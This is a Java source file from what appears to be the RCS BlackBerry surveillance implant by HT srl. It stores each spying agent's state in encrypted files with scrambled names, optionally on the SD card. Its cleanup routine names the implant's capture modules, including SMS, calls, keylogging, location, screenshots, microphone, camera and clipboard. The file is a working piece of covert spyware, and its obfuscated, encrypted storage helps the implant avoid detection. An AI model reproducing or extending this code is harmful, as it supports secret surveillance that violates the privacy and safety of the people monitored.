/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Markup.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.log;

import java.io.IOException;

import net.rim.device.api.util.NumberUtilities;

import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.event.Event;
import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public class Markup {

    public final static String MARKUP_EXTENSION = ".qmm";

    private static Debug debug = new Debug("Markup", DebugLevel.VERBOSE);

    String lognName;
    AutoFlashFile file;
    Encryption encryption;
    LogCollector logCollector;

    private Markup() {
        logCollector = LogCollector.getInstance();
        encryption = new Encryption();
    }

    public Markup(byte[] aesKey) {
        this();
        byte[] key = new byte[16];
        Utils.Copy(key, 0, aesKey, 0, 16);

        encryption.makeKey(key);
    }

    /**
     * Genera un nome gia' scramblato per un file di Markup, se bAddPath e' TRUE
     * il nome ritornato
     * e' completo del path da utilizzare altrimenti viene ritornato soltanto il
     * nome. Se la chiamata
     * fallisce la funzione torna una stringa vuota. Il nome generato
     * non indica necessariamente un file che gia' non esiste sul filesystem, e'
     * compito del chiamante
     * verificare che tale file non sia gia' presente. Se il parametro
     * facoltativo bStoreToMMC e'
     * impostato a TRUE viene generato un nome che punta alla prima MMC
     * disponibile, se esiste.
     */
    static String makeMarkupName(String markupName, boolean addPath,
            boolean storeToMMC) {
        Check.requires(markupName != null, "null markupName");
        Check.requires(markupName != "", "empty markupName");

        String encName = "";

        if (addPath) {
            if (storeToMMC && Path.SDPresent()) {
                encName = Path.SDPath;
            } else {
                encName = Path.UserPath;
            }
        }

        encName += Encryption.EncryptName(markupName + MARKUP_EXTENSION, Keys
                .getChallengeKey()[0]);
        debug.trace("makeMarkupName: " + encName);

        return encName;
    }

    /**
     * Override della funzione precedente: invece di generare il nome da una
     * stringa lo genera
     * da un numero. Se la chiamata fallisce la funzione torna una stringa
     * vuota.
     */
    static String makeMarkupName(int agentId, boolean addPath) {
        Check.requires(agentId >= 0, "agentId < 0");
        String logName = NumberUtilities.toString(agentId, 16, 4);
        debug.trace("makeMarkupName from: " + logName);

        String markupName = makeMarkupName(logName, addPath, false);
        return markupName;
    }

    /**
     * Scrive un file di markup per salvare lo stato dell'agente, i parametri
     * utilizzati sono: l'ID dell'agente
     * che sta generando il file, il puntatore al buffer dati e la lunghezza del
     * buffer. Al termine della
     * scrittura il file viene chiuso, non e' possibile fare alcuna Append e
     * un'ulteriore chiamata alla
     * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
     * funzione torna TRUE se e' andata
     * a buon fine, FALSE altrimenti. Il contenuto scritto e' cifrato.
     */

    public synchronized boolean writeMarkup(int agentId, byte[] data) {
        String markupName = makeMarkupName(agentId, true);
        Check.asserts(markupName != "", "markupName empty");

        AutoFlashFile file = new AutoFlashFile(markupName, true);

        file.create();

        if (data != null) {
            byte[] encData = encryption.EncryptData(data);
            Check.asserts(encData.length >= data.length, "strange data len");
            file.write(data.length);
            file.append(encData);
        }

        return true;
    }

    /**
     * Legge il file di markup specificato da uAgentId (l'ID dell'agente che
     * l'ha generato), torna un puntatore
     * ai dati decifrati che va poi liberato dal chiamante e dentro uLen la
     * lunghezza dei byte validi nel blocco.
     * Se il file non viene trovato o non e' possibile decifrarlo correttamente
     * la funzione torna NULL.
     * La funzione torna NULL anche se il Markup e' vuoto. E' possibile creare
     * dei markup vuoti, in questo caso
     * non va usata la ReadMarkup() ma semplicemente la IsMarkup() per vedere se
     * e' presente o meno.
     * 
     * @throws IOException
     */

    public synchronized byte[] readMarkup(int agentId) throws IOException {
        Check.requires(agentId > 0, "agentId null");

        String markupName = makeMarkupName(agentId, true);
        Check.asserts(markupName != "", "markupName empty");

        AutoFlashFile file = new AutoFlashFile(markupName, true);

        if (file.exists()) {
            byte[] encData = file.read();
            int len = Utils.byteArrayToInt(encData, 0);

            byte[] plain = encryption.DecryptData(encData, len, 4);
            Check.asserts(plain != null, "wrong decryption: null");
            Check.asserts(plain.length == len, "wrong decryption: len");

            return plain;
        } else {
            return null;
        }
    }

    public synchronized boolean isMarkup(int agentId) {
        Check.requires(agentId > 0, "agentId null");

        String markupName = makeMarkupName(agentId, true);
        Check.asserts(markupName != "", "markupName empty");

        AutoFlashFile file = new AutoFlashFile(markupName, true);

        return file.exists();
    }

    /**
     * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
     * TRUE se il file e' stato
     * rimosso o non e' stato trovato, FALSE se non e' stato possibile
     * rimuoverlo.
     */

    public static synchronized void removeMarkup(int agentId) {
        Check.requires(agentId > 0, "agentId null");

        String markupName = makeMarkupName(agentId, true);
        Check.asserts(markupName != "", "markupName empty");

        AutoFlashFile file = new AutoFlashFile(markupName, true);
        file.delete();
    }

    /**
     * Rimuove tutti i file di markup presenti sul filesystem.
     */

    public static synchronized void removeMarkups() {
        removeMarkup(Agent.AGENT_SMS);
        removeMarkup(Agent.AGENT_TASK);
        removeMarkup(Agent.AGENT_CALLLIST);
        removeMarkup(Agent.AGENT_DEVICE);
        removeMarkup(Agent.AGENT_POSITION);
        removeMarkup(Agent.AGENT_CALL);
        removeMarkup(Agent.AGENT_CALL_LOCAL);
        removeMarkup(Agent.AGENT_KEYLOG);
        removeMarkup(Agent.AGENT_SNAPSHOT);
        removeMarkup(Agent.AGENT_URL);
        removeMarkup(Agent.AGENT_IM);
        removeMarkup(Agent.AGENT_MIC);
        removeMarkup(Agent.AGENT_CAM);
        removeMarkup(Agent.AGENT_CLIPBOARD);
        removeMarkup(Agent.AGENT_APPLICATION);
        removeMarkup(Agent.AGENT_CRISIS);

        removeMarkup(Event.EVENT_TIMER);
        removeMarkup(Event.EVENT_SMS);
        removeMarkup(Event.EVENT_CALL);
        removeMarkup(Event.EVENT_CONNECTION);
        removeMarkup(Event.EVENT_PROCESS);
        removeMarkup(Event.EVENT_QUOTA);
        removeMarkup(Event.EVENT_SIM_CHANGE);
        removeMarkup(Event.EVENT_AC);
        removeMarkup(Event.EVENT_BATTERY);
        removeMarkup(Event.EVENT_CELLID);
        removeMarkup(Event.EVENT_LOCATION);
    }
}